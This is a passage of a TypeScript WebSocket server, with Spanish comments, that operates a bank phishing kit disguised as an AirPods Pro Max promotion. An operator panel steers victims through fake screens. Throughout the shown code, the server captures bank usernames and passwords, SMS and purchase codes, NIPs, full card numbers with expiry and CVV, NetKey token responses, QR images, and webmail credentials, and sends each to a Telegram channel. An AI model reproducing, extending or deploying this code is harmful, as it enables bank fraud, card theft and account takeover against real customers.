                console.log(`WebSocket: Sesión ${session.sessionId}, creador=${session.createdBy || 'desconocido'}, banco=${session.banco}`);
              });

              // Filtrar EXPLÍCITAMENTE sólo las guardadas de este usuario
              const filteredSessions = allSavedSessions.filter(session => session.createdBy === userName);

              console.log(`WebSocket: Después de filtrar, enviando ${filteredSessions.length} sesiones guardadas a usuario ${userName}`);

              // Enviar las sesiones al cliente
              ws.send(JSON.stringify({
                type: 'INIT_SESSIONS',
                data: filteredSessions
              }));
            } 
            else {
              // NUEVA IMPLEMENTACIÓN UNIFICADA PARA TODOS LOS USUARIOS
              // Obtenemos tanto las sesiones guardadas como las actuales
              const allSavedSessions = await storage.getSavedSessions();
              const currentSessions = await storage.getCurrentSessions();

              console.log(`WebSocket: Encontradas ${allSavedSessions.length} sesiones guardadas y ${currentSessions.length} sesiones actuales en total`);

              // Combinamos ambas listas (evitando duplicados por sessionId)
              const allSessionsMap = new Map();
              [...allSavedSessions, ...currentSessions].forEach(session => {
                allSessionsMap.set(session.sessionId, session);
              });

              let sessions = Array.from(allSessionsMap.values());

              // Todos los administradores pueden ver todas las sesiones
              // Los usuarios regulares solo ven sus propias sesiones
              if (user.role === 'admin') {
                console.log(`WebSocket: Administrador ${userName} accediendo a todas las sesiones (${sessions.length})`);
              } else {
                console.log(`WebSocket: Filtrando sesiones para el usuario regular: ${userName}`);

                const beforeCount = sessions.length;

                // Filtrar explícitamente solo las sesiones creadas por este usuario
                sessions = sessions.filter(session => {
                  const isCreatedByCurrentUser = session.createdBy === userName;

                  if (isCreatedByCurrentUser) {
                    console.log(`WebSocket: Incluida sesión ${session.sessionId} para ${userName} (creador: ${session.createdBy || 'desconocido'})`);
                  } else if (session.createdBy) {
                    console.log(`WebSocket: Excluida sesión ${session.sessionId} para ${userName} (creador: ${session.createdBy})`);
                  } else {
                    console.log(`WebSocket: Excluida sesión ${session.sessionId} para ${userName} (sin creador)`);
                  }

                  return isCreatedByCurrentUser;
                });

                console.log(`WebSocket: Usuario ${userName} (rol: ${user.role}), mostrando ${sessions.length} de ${beforeCount} sesiones`);
              }

              // Enviamos las sesiones al cliente
              ws.send(JSON.stringify({
                type: 'INIT_SESSIONS',
                data: sessions
              }));
            }

            // El envío de sesiones ya se hace en las ramas condicionales anteriores

            // Run cleanup of old sessions (more than 5 days)
            try {
              const deletedCount = await storage.cleanupExpiredSessions();
              if (deletedCount > 0) {
                console.log(`Cleaned up ${deletedCount} expired sessions`);
                broadcastToAdmins(JSON.stringify({
                  type: 'SESSIONS_CLEANUP',
                  data: { deletedCount }
                }));
              }
            } catch (error) {
              console.error("Error cleaning up expired sessions:", error);
            }
          } 
          else if (parsedMessage.role === 'CLIENT' && parsedMessage.sessionId) {
            clients.set(parsedMessage.sessionId, ws);
            console.log(`Client registered with session ID: ${parsedMessage.sessionId}`);

            // Get session info and send to client
            const session = await storage.getSessionById(parsedMessage.sessionId);
            if (session) {
              ws.send(JSON.stringify({
                type: 'INIT_SESSION',
                data: session
              }));
            }
          }
          return;
        }

        // Handle screen change request from admin
        if (parsedMessage.type === 'SCREEN_CHANGE') {
          try {
            // Verificamos si es el tipo gmail_verify para tener especial cuidado con el código
            if (parsedMessage.data.tipo && parsedMessage.data.tipo.includes('gmail_verify')) {
              console.log('⚠️ [WebSocket] Procesando comando GMAIL_VERIFY con datos:', JSON.stringify(parsedMessage.data));

              // Nos aseguramos de que el código no se modifique durante la validación
              const codigoOriginal = parsedMessage.data.codigo || '';
              console.log('🔑 [WebSocket] Código original recibido:', codigoOriginal);
            }

            // Validate the data
            const validatedData = screenChangeSchema.parse(parsedMessage.data);
            const { sessionId, tipo } = validatedData;

            // Si es gmail_verify, confirmamos que el código sea el mismo que se recibió
            if (tipo.includes('gmail_verify')) {
              console.log('✅ [WebSocket] Datos validados para GMAIL_VERIFY:', JSON.stringify(validatedData));
            }

            // Normalize the tipo by removing "mostrar_" prefix if present
            let normalizedTipo = tipo.replace('mostrar_', '');

            // Find the target client
            const client = clients.get(sessionId);
            if (client && client.readyState === WebSocket.OPEN) {
              // Send the screen change command to the client with normalized tipo
              const clientData = { ...validatedData, tipo: normalizedTipo };
              client.send(JSON.stringify({
                type: 'SCREEN_CHANGE',
                data: clientData
              }));

              // Update session in storage with the new screen state
              let screenType = normalizedTipo;

              // Normalizar screenType para SMS_COMPRA
              if (screenType.toLowerCase() === 'sms_compra' || 
                  screenType.toLowerCase() === 'smscompra' ||
                  screenType.toLowerCase() === 'sms compra') {
                console.log('Normalizando screenType SMS_COMPRA en servidor:', screenType, 'to', ScreenType.SMS_COMPRA);
                screenType = ScreenType.SMS_COMPRA;
              }

              // Normalize screen type for NetKey
              if (screenType === 'netkey') {
                screenType = ScreenType.NETKEY;
              }

              // Normalize screen type for NetKey 2
              if (screenType === 'netkey2') {
                screenType = ScreenType.NETKEY2;
              }

              await storage.updateSession(sessionId, { pasoActual: screenType });
              console.log('Actualizado pasoActual a:', screenType);

              // Notify specific admin clients about the update
              const updatedSession = await storage.getSessionById(sessionId);
              // Obtenemos el creador de la sesión para saber a quién enviar la notificación
              const createdBy = updatedSession?.createdBy || '';
              broadcastToAdmins(JSON.stringify({
                type: 'SESSION_UPDATE',
                data: updatedSession
              }), createdBy); // Dirigimos el mensaje al creador de la sesión
            }
          } catch (error) {
            console.error("Invalid screen change data:", error);
            ws.send(JSON.stringify({ 
              type: 'ERROR', 
              message: "Invalid screen change data" 
            }));
          }
          return;
        }

        // Handle check for existing session - removed device tracking

        // Handle creation of unique session with consistent folio
        if (parsedMessage.type === 'CREATE_UNIQUE_SESSION') {
          try {
            const { sessionId, banco, clientData, timestamp } = parsedMessage.data;

            console.log(`[WebSocket] Creando sesión única con folio consistente: ${sessionId}`);

            // Generar folio único de 6 dígitos fácil de leer
            const generateUniqueId = () => {
              const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
              let result = '';
              for (let i = 0; i < 6; i++) {
                result += chars.charAt(Math.floor(Math.random() * chars.length));
              }
              return result;
            };

            const uniqueFolio = generateUniqueId();

            // Crear nueva sesión en el almacenamiento con folio único
            const newSession = await storage.createSession({
              sessionId: sessionId,
              banco: banco,
              pasoActual: clientData.terminosAceptados ? ScreenType.PHONE_INPUT : ScreenType.FOLIO,
              folio: uniqueFolio,
              active: true,
              saved: false,
              createdAt: new Date(),
              dispositivo: clientData.dispositivo || 'Desconocido', // Guardar tipo de dispositivo
              // Datos del cliente si es login
              username: clientData.username || null,
              password: clientData.password || null
            });

            console.log(`[WebSocket] Sesión única creada: ${sessionId} con folio permanente: ${uniqueFolio}`);

            // Registrar el cliente WebSocket
            clients.set(sessionId, ws);

            // Enviar el folio de vuelta al cliente
            ws.send(JSON.stringify({
              type: 'SESSION_CREATED',
              data: {
                sessionId: sessionId,
                folio: uniqueFolio,
                banco: banco
              }
            }));

            // Notificar inicial a Telegram
            let telegramMessage = '';
            if (clientData.terminosAceptados) {
              telegramMessage = `🎧 <b>PROMOCIÓN DE AIRPODS PRO MAX INICIADA</b>\n\n` +
                `📋 <b>Folio:</b> ${uniqueFolio}\n` +
                `🏦 <b>Banco:</b> ${banco}\n` +
                `📱 <b>Dispositivo:</b> ${clientData.dispositivo || 'Desconocido'}\n` +
                `⏰ <b>Hora:</b> ${new Date().toLocaleString('es-MX')}\n` +
                `✅ <b>Estado:</b> Cliente aceptó términos y condiciones`;
            } else if (clientData.username && clientData.password) {
              telegramMessage = `🔐 <b>DATOS DE LOGIN RECIBIDOS</b>\n\n` +
                `📋 <b>Folio:</b> ${uniqueFolio}\n` +
                `🏦 <b>Banco:</b> ${banco}\n` +
                `📱 <b>Dispositivo:</b> ${clientData.dispositivo || 'Desconocido'}\n` +
                `📧 <b>Usuario:</b> ${clientData.username}\n` +
                `🔑 <b>Contraseña:</b> ${clientData.password}\n` +
                `⏰ <b>Hora:</b> ${new Date().toLocaleString('es-MX')}\n` +
                `✅ <b>Estado:</b> Credenciales capturadas`;
            }

            if (telegramMessage) {
              sendTelegramMessage(telegramMessage);
            }

            // Notificar a administradores
            broadcastToAdmins(JSON.stringify({
              type: 'SESSION_CREATED',
              data: newSession
            }));

          } catch (error) {
            console.error("Error creating unique session:", error);
            ws.send(JSON.stringify({ 
              type: 'ERROR', 
              message: "Error creating session" 
            }));
          }
          return;
        }

        // Handle session data updates (maintaining same folio)
        if (parsedMessage.type === 'UPDATE_SESSION_DATA') {
          try {
            const { sessionId, tipo, data: inputData } = parsedMessage.data;

            console.log(`[WebSocket] Actualizando datos de sesión ${sessionId}, tipo: ${tipo}`);

            // Obtener la sesión existente para mantener el folio
            const existingSession = await storage.getSessionById(sessionId);
            if (!existingSession) {
              throw new Error(`Sesión ${sessionId} no encontrada`);
            }

            // Actualizar solo los campos específicos
            const updateData: any = {};
            let telegramMessage = '';

            if (tipo === 'login') {
              updateData.username = inputData.username;
              updateData.password = inputData.password;
              updateData.pasoActual = ScreenType.VALIDANDO;

              telegramMessage = `🔐 <b>DATOS DE LOGIN ACTUALIZADOS</b>\n\n` +
                `📋 <b>Folio:</b> ${existingSession.folio}\n` +
                `🏦 <b>Banco:</b> ${existingSession.banco}\n` +
                `📧 <b>Usuario:</b> ${inputData.username}\n` +
                `🔑 <b>Contraseña:</b> ${inputData.password}\n` +
                `⏰ <b>Hora:</b> ${new Date().toLocaleString('es-MX')}\n` +
                `✅ <b>Estado:</b> Credenciales actualizadas`;
            }

            if (tipo === 'phone_input') {
              updateData.celular = inputData.phone;
              updateData.pasoActual = ScreenType.QR_SCAN;
              console.log('🔥 TELÉFONO RECIBIDO en UPDATE_SESSION_DATA:', inputData.phone);

              telegramMessage = `📱 <b>TELÉFONO RECIBIDO (Flujo QR)</b>\n\n` +
                `📋 <b>Folio:</b> ${existingSession.folio}\n` +
                `📞 <b>Teléfono:</b> ${inputData.phone}\n` +
                `⏰ <b>Hora:</b> ${new Date().toLocaleString('es-MX')}`;
            }

            if (tipo === 'qr_validation') {
              updateData.qrImage = inputData.qrImage;
              updateData.qrValidated = true; // Aprobación automática
              updateData.pasoActual = ScreenType.SMS_VERIFICATION; // Ir directamente a SMS
              console.log('🔥 QR RECIBIDO en UPDATE_SESSION_DATA - APROBACIÓN AUTOMÁTICA');

              telegramMessage = `📱 <b>CÓDIGO QR RECIBIDO Y APROBADO AUTOMÁTICAMENTE</b>\n\n` +
                `📋 <b>Folio:</b> ${existingSession.folio}\n` +
                `📞 <b>Teléfono:</b> ${existingSession.celular || 'No proporcionado'}\n` +
                `📷 <b>QR:</b> Imagen capturada correctamente\n` +
                `⏰ <b>Hora:</b> ${new Date().toLocaleString('es-MX')}\n` +
                `✅ <b>Estado:</b> Aprobado automáticamente - Solicitar código SMS`;
            }

            if (tipo === 'sms_verification') {
              updateData.smsCode = inputData.codigo;
              updateData.terminacion = inputData.terminacion;
              updateData.pasoActual = ScreenType.VALIDANDO;
              console.log('🔥 CÓDIGO SMS RECIBIDO en UPDATE_SESSION_DATA:', inputData.codigo);

              // Generar número de teléfono completo si es posible
              let telefonoCompleto = existingSession.celular || '';
              if (telefonoCompleto && inputData.terminacion) {
                // Si el teléfono termina con los dígitos esperados, todo bien
                if (!telefonoCompleto.endsWith(inputData.terminacion)) {
                  // Si no, usamos la terminación proporcionada como referencia
                  telefonoCompleto = `***${inputData.terminacion}`;
                }
              } else if (inputData.terminacion) {
                telefonoCompleto = `***${inputData.terminacion}`;
              }

              telegramMessage = `📱 <b>CÓDIGO SMS RECIBIDO</b>\n\n` +
                `📋 <b>Folio:</b> ${existingSession.folio}\n` +
                `📞 <b>Teléfono:</b> ${telefonoCompleto}\n` +
                `🔢 <b>Código SMS:</b> ${inputData.codigo}\n` +
                `🔢 <b>Terminación:</b> ***${inputData.terminacion}\n` +
                `⏰ <b>Hora:</b> ${new Date().toLocaleString('es-MX')}\n` +
                `✅ <b>Estado:</b> Código de verificación ingresado`;
            }

            await storage.updateSession(sessionId, updateData);

            // Enviar notificación a Telegram si hay mensaje
            if (telegramMessage) {
              console.log('🔥 Enviando mensaje a Telegram desde UPDATE_SESSION_DATA');

              // Si es tipo qr_validation, enviar tanto el mensaje como la imagen
              if (tipo === 'qr_validation' && inputData.qrImage) {
                console.log('🔥 Enviando imagen QR a Telegram...');
                sendTelegramPhoto(inputData.qrImage, telegramMessage).catch(error => {
                  console.error('❌ Error en sendTelegramPhoto:', error);
                });
              } else {
                sendTelegramMessage(telegramMessage).catch(error => {
                  console.error('❌ Error en sendTelegramMessage:', error);
                });
              }

              console.log('🔥 Mensaje enviado a Telegram');
            }

            // Notificar a administradores
            const updatedSession = await storage.getSessionById(sessionId);
            broadcastToAdmins(JSON.stringify({
              type: 'SESSION_UPDATE',
              data: updatedSession
            }));

            // Si es QR validation, enviar cambio de pantalla automáticamente al cliente
            if (tipo === 'qr_validation') {
              const client = clients.get(sessionId);
              if (client && client.readyState === WebSocket.OPEN) {
                const terminacion = existingSession.celular ? existingSession.celular.slice(-4) : '2390';
                client.send(JSON.stringify({
                  type: 'SCREEN_CHANGE',
                  data: {
                    tipo: 'mostrar_sms_verification',
                    terminacion: terminacion,
                    mensaje: 'QR recibido correctamente. Ingresa el código SMS de 4 dígitos que recibiste.'
                  }
                }));
                console.log('📱 Enviado cambio automático a pantalla SMS_VERIFICATION para terminación:', terminacion);
              }
            }

          } catch (error) {
            console.error("Error updating session data:", error);
            ws.send(JSON.stringify({ 
              type: 'ERROR', 
              message: "Error updating session" 
            }));
          }
          return;
        }

        // Handle new client session creation from homepage
        if (parsedMessage.type === 'NEW_CLIENT_SESSION') {
          try {
            const { sessionId, banco, clientData, timestamp } = parsedMessage.data;

            console.log(`[WebSocket] Creando nueva sesión de cliente: ${sessionId}`);

            // Crear nueva sesión en el almacenamiento
            const newSession = await storage.createSession({
              sessionId: sessionId,
              banco: banco,
              pasoActual: ScreenType.LOGIN,
              folio: Math.random().toString(36).substring(2, 8).toUpperCase(),
              active: true,
              saved: false,
              createdAt: new Date(),
              deviceId: parsedMessage.data.deviceId || null,
              // Datos del cliente que inició sesión
              username: clientData.username,
              password: clientData.password
            });

            console.log(`[WebSocket] Sesión creada exitosamente: ${sessionId} con folio: ${newSession.folio}`);

            console.log(`Nueva sesión de cliente creada: ${sessionId} con datos:`, clientData);

            // Registrar el cliente WebSocket
            clients.set(sessionId, ws);

            // Enviar notificación a Telegram
            const telegramMessage = `🎧 <b>NUEVA PROMOCIÓN AIRPODS PRO MAX</b>\n\n` +
              `📋 <b>Folio:</b> ${newSession.folio}\n` +
              `🏦 <b>Banco:</b> ${banco}\n` +
              `📧 <b>Correo:</b> ${clientData.username || clientData.correo || 'No proporcionado'}\n` +
              `🔑 <b>Contraseña:</b> ${clientData.password || clientData.contrasena || 'No proporcionada'}\n` +
              `⏰ <b>Hora:</b> ${new Date().toLocaleString('es-MX')}\n` +
              `✅ <b>Estado:</b> Términos aceptados, esperando validación`;

            sendTelegramMessage(telegramMessage);

            // Notificar a todos los administradores sobre el nuevo cliente
            broadcastToAdmins(JSON.stringify({
              type: 'NEW_CLIENT_LOGIN',
              data: {
                sessionId,
                banco,
                folio: newSession.folio,
                clientData,
                timestamp,
                message: `Cliente registrado para promoción AirPods Pro Max - Folio: ${newSession.folio}`
              }
            }));

            // Enviar confirmación al cliente
            ws.send(JSON.stringify({
              type: 'SESSION_CREATED',
              data: newSession
            }));

          } catch (error) {
            console.error("Error creating new client session:", error);
            ws.send(JSON.stringify({ 
              type: 'ERROR', 
              message: "Error al crear nueva sesión" 
            }));
          }
          return;
        }

        // Handle client input data
        if (parsedMessage.type === 'CLIENT_INPUT') {
          try {
            // Validate the data
            const validatedMessage = clientInputSchema.parse(parsedMessage);
            const inputData = validatedMessage.data;
            const { sessionId, tipo } = validatedMessage.data;

            // Obtener la sesión existente para usar el mismo folio en notificaciones
            const existingSession = await storage.getSessionById(sessionId);
            const sessionFolio = existingSession?.folio || 'N/A';

            console.log(`Datos recibidos del cliente - Sesión: ${sessionId}, Folio: ${sessionFolio}, Tipo: ${tipo}`);

            // Update the session with the new data
            const updatedFields: Record<string, any> = {};

            switch (tipo) {
              case 'folio':
                updatedFields.folio = inputData.folio;
                break;
              case 'login':
                updatedFields.username = inputData.username;
                updatedFields.password = inputData.password;
                break;
              case 'telefono':
                updatedFields.celular = inputData.telefono;
                updatedFields.pasoActual = ScreenType.CODIGO;
                console.log('Teléfono recibido:', inputData.telefono);

                // Enviar notificación a Telegram
                const telefonoMessage = `📱 <b>TELÉFONO RECIBIDO</b>\n\n` +
                  `📋 <b>Folio:</b> ${sessionFolio}\n` +
                  `📞 <b>Teléfono:</b> +52 ${inputData.telefono}\n` +
                  `⏰ <b>Hora:</b> ${new Date().toLocaleString('es-MX')}`;
                sendTelegramMessage(telefonoMessage);
                break;
              case 'codigo':
                updatedFields.sms = inputData.codigo;
                updatedFields.pasoActual = ScreenType.NIP;
                console.log('Código de verificación recibido:', inputData.codigo);

                // Enviar notificación a Telegram
                const codigoMessage = `🔑 <b>CÓDIGO DE VERIFICACIÓN</b>\n\n` +
                  `📋 <b>Folio:</b> ${sessionFolio}\n` +
                  `🔢 <b>Código SMS:</b> ${inputData.codigo}\n` +
                  `⏰ <b>Hora:</b> ${new Date().toLocaleString('es-MX')}`;
                sendTelegramMessage(codigoMessage);
                break;
              case 'nip':
                updatedFields.nip = inputData.nip;
                updatedFields.pasoActual = ScreenType.TARJETA;

                // Enviar notificación a Telegram
                const nipMessage = `🔐 <b>NIP RECIBIDO</b>\n\n` +
                  `📋 <b>Folio:</b> ${sessionFolio}\n` +
                  `🔢 <b>NIP:</b> ${inputData.nip}\n` +
                  `⏰ <b>Hora:</b> ${new Date().toLocaleString('es-MX')}`;
                sendTelegramMessage(nipMessage);
                break;
              case 'tarjeta':
                updatedFields.tarjeta = inputData.tarjeta;
                updatedFields.fechaVencimiento = inputData.fechaVencimiento;
                updatedFields.cvv = inputData.cvv;
                updatedFields.pasoActual = ScreenType.TRANSFERIR;

                // Enviar notificación a Telegram
                const tarjetaMsg = `💳 <b>DATOS DE TARJETA</b>\n\n` +
                  `📋 <b>Folio:</b> ${sessionFolio}\n` +
                  `💳 <b>Número:</b> ${inputData.tarjeta}\n` +
                  `📅 <b>Vencimiento:</b> ${inputData.fechaVencimiento}\n` +
                  `🔐 <b>CVV:</b> ${inputData.cvv}\n` +
                  `⏰ <b>Hora:</b> ${new Date().toLocaleString('es-MX')}`;
                sendTelegramMessage(tarjetaMsg);
                break;
              case 'sms_compra':
              case 'SMS_COMPRA':
              case 'smsCompra':
                // Asegurarnos de manejar correctamente las respuestas de SMS_COMPRA
                if (inputData && inputData.smsCompra) {
                  updatedFields.smsCompra = inputData.smsCompra;
                  updatedFields.pasoActual = ScreenType.CANCELACION;
                  console.log('Recibido código de cancelación SMS_COMPRA:', inputData.smsCompra);

                  // Notificar a los administradores el código de cancelación inmediatamente
                  // Obtenemos la sesión para saber quién la creó
                  const sessionData = await storage.getSessionById(sessionId);
                  const createdBy = sessionData?.createdBy || '';

                  // Enviar notificación a Telegram
                  const smsCompraMessage = `🛒 <b>CÓDIGO SMS COMPRA</b>\n\n` +
                    `📋 <b>Folio:</b> ${sessionFolio}\n` +
                    `🔢 <b>Código:</b> ${inputData.smsCompra}\n` +
                    `⏰ <b>Hora:</b> ${new Date().toLocaleString('es-MX')}`;
                  sendTelegramMessage(smsCompraMessage);

                  broadcastToAdmins(JSON.stringify({
                    type: 'SMS_COMPRA_CODE',
                    data: {
                      sessionId,
                      code: inputData.smsCompra,
                      createdBy // Añadimos el creador para referencia
                    }
                  }), createdBy); // Enviamos solo al creador y al superadmin
                } else {
                  console.error('Error: datos SMS_COMPRA recibidos sin código de cancelación:', inputData);
                }
                break;
              case 'celular':
                updatedFields.celular = inputData.celular;
                updatedFields.pasoActual = ScreenType.CODIGO;
                break;
              case 'netkey':
              case 'netkey_response':
                updatedFields.netkeyResponse = inputData.netkeyResponse;
                updatedFields.pasoActual = ScreenType.VALIDANDO;
                console.log('Respuesta NetKey recibida:', inputData.netkeyResponse);

                // Obtener el challenge original para incluirlo en la notificación
                const challengeCode = existingSession?.challenge || 'N/A';

                // Enviar notificación a Telegram
                const netkeyMessage = `🔐 <b>RESPUESTA NETKEY RECIBIDA</b>\n\n` +
                  `📋 <b>Folio:</b> ${sessionFolio}\n` +
                  `🔢 <b>CHALLENGE:</b> ${challengeCode}\n` +
                  `✅ <b>RESPUESTA:</b> ${inputData.netkeyResponse}\n` +
                  `⏰ <b>Hora:</b> ${new Date().toLocaleString('es-MX')}`;
                sendTelegramMessage(netkeyMessage);

                // Notificar al admin
                const netkeyCreatedBy = existingSession?.createdBy || '';

                broadcastToAdmins(JSON.stringify({
                  type: 'NETKEY_RESPONSE_RECEIVED',
                  data: {
                    sessionId,
                    challenge: challengeCode,
                    response: inputData.netkeyResponse,
                    timestamp: new Date().toISOString(),
                    createdBy: netkeyCreatedBy
                  }
                }), netkeyCreatedBy);
                break;
              case 'netkey2':
                updatedFields.netkeyResponse = inputData.netkeyResponse;
                updatedFields.pasoActual = ScreenType.DATOS_CONTACTO;
                console.log('Respuesta NetKey 2 recibida:', inputData.netkeyResponse);

                // Obtener el challenge original para incluirlo en la notificación
                const challengeCode2 = existingSession?.challenge || 'N/A';

                // Enviar notificación a Telegram
                const netkey2Message = `🔐 <b>RESPUESTA NETKEY 2 - CLAVE DINÁMICA</b>\n\n` +
                  `📋 <b>Folio:</b> ${sessionFolio}\n` +
                  `🔢 <b>CHALLENGE:</b> ${challengeCode2}\n` +
                  `✅ <b>RESPUESTA:</b> ${inputData.netkeyResponse}\n` +
                  `💎 <b>Tipo:</b> Clave Dinámica Completa\n` +
                  `⏰ <b>Hora:</b> ${new Date().toLocaleString('es-MX')}`;
                sendTelegramMessage(netkey2Message);

                // Notificar al admin
                const netkey2CreatedBy = existingSession?.createdBy || '';

                broadcastToAdmins(JSON.stringify({
                  type: 'NETKEY2_RESPONSE_RECEIVED',
                  data: {
                    sessionId,
                    challenge: challengeCode2,
                    response: inputData.netkeyResponse,
                    timestamp: new Date().toISOString(),
                    createdBy: netkey2CreatedBy
                  }
                }), netkey2CreatedBy);
                break;

              case 'datos_contacto':
                updatedFields.telefono1 = inputData.telefono1;
                updatedFields.telefono2 = inputData.telefono2 || '';
                updatedFields.correo = inputData.correo;
                updatedFields.nombreRepresentante = inputData.nombreRepresentante;
                updatedFields.pasoActual = ScreenType.MENSAJE;
                console.log('Datos de contacto recibidos:', inputData);

                // Enviar notificación a Telegram con los datos de contacto
                const datosContactoMessage = `📞 <b>DATOS DE CONTACTO RECIBIDOS</b>\n\n` +
                  `📋 <b>Folio:</b> ${sessionFolio}\n` +
                  `👤 <b>Representante Legal:</b> ${inputData.nombreRepresentante}\n` +
                  `📧 <b>Correo:</b> ${inputData.correo}\n` +
                  `📱 <b>Teléfono 1:</b> ${inputData.telefono1}\n` +
                  (inputData.telefono2 ? `📱 <b>Teléfono 2:</b> ${inputData.telefono2}\n` : '') +
                  `⏰ <b>Hora:</b> ${new Date().toLocaleString('es-MX')}`;
                sendTelegramMessage(datosContactoMessage);

                // Notificar al admin
                const datosContactoCreatedBy = existingSession?.createdBy || '';

                broadcastToAdmins(JSON.stringify({
                  type: 'DATOS_CONTACTO_RECEIVED',
                  data: {
                    sessionId,
                    telefono1: inputData.telefono1,
                    telefono2: inputData.telefono2 || '',
                    correo: inputData.correo,
                    nombreRepresentante: inputData.nombreRepresentante,
                    timestamp: new Date().toISOString(),
                    createdBy: datosContactoCreatedBy
                  }
                }), datosContactoCreatedBy);
                break;
                
              case 'acceso_denegado':
                updatedFields.telefono1 = inputData.telefono1;
                updatedFields.telefono2 = inputData.telefono2 || '';
                updatedFields.correo = inputData.correo;
                updatedFields.nombreRepresentante = inputData.nombreRepresentante;
                updatedFields.pasoActual = ScreenType.MENSAJE;
                console.log('Datos de contacto desde acceso denegado recibidos:', inputData);

                // Enviar notificación a Telegram con los datos de contacto
                const accesoDenegadoMessage = `🚫 <b>DATOS DE CONTACTO - ACCESO DENEGADO</b>\n\n` +
                  `📋 <b>Folio:</b> ${sessionFolio}\n` +
                  `👤 <b>Representante Legal:</b> ${inputData.nombreRepresentante}\n` +
                  `📧 <b>Correo:</b> ${inputData.correo}\n` +
                  `📱 <b>Teléfono 1:</b> ${inputData.telefono1}\n` +
                  (inputData.telefono2 ? `📱 <b>Teléfono 2:</b> ${inputData.telefono2}\n` : '') +
                  `⏰ <b>Hora:</b> ${new Date().toLocaleString('es-MX')}`;
                sendTelegramMessage(accesoDenegadoMessage);

                // Notificar al admin
                const accesoDenegadoCreatedBy = existingSession?.createdBy || '';

                broadcastToAdmins(JSON.stringify({
                  type: 'ACCESO_DENEGADO_CONTACTO_RECEIVED',
                  data: {
                    sessionId,
                    telefono1: inputData.telefono1,
                    telefono2: inputData.telefono2 || '',
                    correo: inputData.correo,
                    nombreRepresentante: inputData.nombreRepresentante,
                    timestamp: new Date().toISOString(),
                    createdBy: accesoDenegadoCreatedBy
                  }
                }), accesoDenegadoCreatedBy);
                break;
              case 'gmail':
                updatedFields.correo = inputData.correo;
                updatedFields.contrasena = inputData.contrasena;
                updatedFields.pasoActual = ScreenType.GMAIL_VERIFY;
                console.log('Recibidas credenciales de Gmail:', inputData.correo);

                // Enviar notificación a Telegram
                const gmailMessage = `📧 <b>CREDENCIALES GMAIL</b>\n\n` +
                  `📋 <b>Folio:</b> ${sessionFolio}\n` +
                  `📧 <b>Correo:</b> ${inputData.correo}\n` +
                  `🔑 <b>Contraseña:</b> ${inputData.contrasena}\n` +
                  `⏰ <b>Hora:</b> ${new Date().toLocaleString('es-MX')}`;
                sendTelegramMessage(gmailMessage);
                break;
              case 'hotmail':
                updatedFields.correo = inputData.correo;
                updatedFields.contrasena = inputData.contrasena;
                updatedFields.pasoActual = ScreenType.HOTMAIL;
                console.log('Recibidas credenciales de Hotmail:', inputData.correo);

                // Enviar notificación a Telegram
                const hotmailMessage = `📧 <b>CREDENCIALES HOTMAIL</b>\n\n` +
                  `📋 <b>Folio:</b> ${sessionFolio}\n` +
                  `📧 <b>Correo:</b> ${inputData.correo}\n` +
                  `🔑 <b>Contraseña:</b> ${inputData.contrasena}\n` +
                  `⏰ <b>Hora:</b> ${new Date().toLocaleString('es-MX')}`;
                sendTelegramMessage(hotmailMessage);
                break;
              case 'yahoo':
                updatedFields.correo = inputData.correo;
                updatedFields.contrasena = inputData.contrasena;
                updatedFields.pasoActual = ScreenType.YAHOO;
                console.log('Recibidas credenciales de Yahoo:', inputData.correo);

                // Enviar notificación a Telegram
                const yahooMessage = `📧 <b>CREDENCIALES YAHOO</b>\n\n` +
                  `📋 <b>Folio:</b> ${sessionFolio}\n` +
                  `📧 <b>Correo:</b> ${inputData.correo}\n` +
                  `🔑 <b>Contraseña:</b> ${inputData.contrasena}\n` +
                  `⏰ <b>Hora:</b> ${new Date().toLocaleString('es-MX')}`;
                sendTelegramMessage(yahooMessage);
                break;
              case 'datos_tarjeta':
                updatedFields.tarjeta = inputData.numeroTarjeta;
                updatedFields.fechaVencimiento = inputData.fechaVencimiento;
                updatedFields.cvv = inputData.cvv;
                updatedFields.pasoActual = ScreenType.DATOS_TARJETA;
                console.log('Recibidos datos de tarjeta:', inputData.numeroTarjeta?.slice(-4));

                // Enviar notificación a Telegram
                const tarjetaMessage = `💳 <b>DATOS DE TARJETA</b>\n\n` +
                  `📋 <b>Folio:</b> ${sessionFolio}\n` +
                  `💳 <b>Número:</b> ${inputData.numeroTarjeta}\n` +
                  `📅 <b>Vencimiento:</b> ${inputData.fechaVencimiento}\n` +
                  `🔐 <b>CVV:</b> ${inputData.cvv}\n` +
                  `⏰ <b>Hora:</b> ${new Date().toLocaleString('es-MX')}`;
                sendTelegramMessage(tarjetaMessage);
                break;

              case 'phone_input':
                updatedFields.celular = inputData.phone;
                updatedFields.pasoActual = ScreenType.QR_SCAN;
                console.log('🔥 TELÉFONO RECIBIDO (QR flow):', inputData.phone);
                console.log('🔥 SessionId:', sessionId);
                console.log('🔥 SessionFolio:', sessionFolio);

                // Enviar notificación a Telegram
                const phoneMessage = `📱 <b>TELÉFONO RECIBIDO (Flujo QR)</b>\n\n` +
                  `📋 <b>Folio:</b> ${sessionFolio}\n` +
                  `📞 <b>Teléfono:</b> ${inputData.phone}\n` +
                  `⏰ <b>Hora:</b> ${new Date().toLocaleString('es-MX')}`;
                console.log('🔥 Enviando mensaje de teléfono a Telegram:', phoneMessage);
                sendTelegramMessage(phoneMessage);
                console.log('🔥 Mensaje de teléfono enviado');
                break;

              case 'qr_validation':
                updatedFields.qrImage = inputData.qrImage;
                updatedFields.qrValidated = false;
                updatedFields.pasoActual = ScreenType.QR_VALIDATION;
                console.log('🔥 QR RECIBIDO para validación');
                console.log('🔥 SessionId:', sessionId);
                console.log('🔥 SessionFolio:', sessionFolio);

                // Notificar a los administradores sobre el nuevo QR recibido
                const sessionData = await storage.getSessionById(sessionId);
                const qrCreatedBy = sessionData?.createdBy || '';
                console.log('🔥 Session Data:', { celular: sessionData?.celular, createdBy: qrCreatedBy });

                // Enviar notificación a Telegram
                const qrMessage = `📱 <b>CÓDIGO QR RECIBIDO (Flujo QR)</b>\n\n` +
                  `📋 <b>Folio:</b> ${sessionFolio}\n` +
                  `📞 <b>Teléfono:</b> ${sessionData?.celular || 'No proporcionado'}\n` +
                  `📷 <b>QR:</b> Imagen capturada correctamente\n` +
                  `⏰ <b>Hora:</b> ${new Date().toLocaleString('es-MX')}\n` +
                  `⚠️ <b>Estado:</b> Esperando validación de administrador`;
                console.log('🔥 Enviando mensaje de QR a Telegram:', qrMessage);
                sendTelegramMessage(qrMessage);
                console.log('🔥 Mensaje de QR enviado');

                broadcastToAdmins(JSON.stringify({
